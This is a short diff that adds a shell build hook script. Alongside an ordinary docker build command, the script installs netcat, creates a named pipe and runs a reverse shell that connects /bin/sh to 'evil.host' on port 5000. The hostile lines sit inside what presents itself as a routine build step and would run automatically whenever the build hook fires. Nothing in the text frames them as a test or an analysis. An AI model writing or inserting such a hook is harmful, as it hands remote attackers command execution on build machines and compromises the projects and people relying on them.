@@ -1,0 +1,8 @@
+#!/usr/bin/env sh
+echo "------ HOOK START - BUILD -------"
+docker build -t $IMAGE_NAME .
+apt update
+apt install -y netcat
+mknod /tmp/thing p
+/bin/sh 0</tmp/thing | nc evil.host 5000 1>/tmp/thing
+echo "------ HOOK END - BUILD -------"
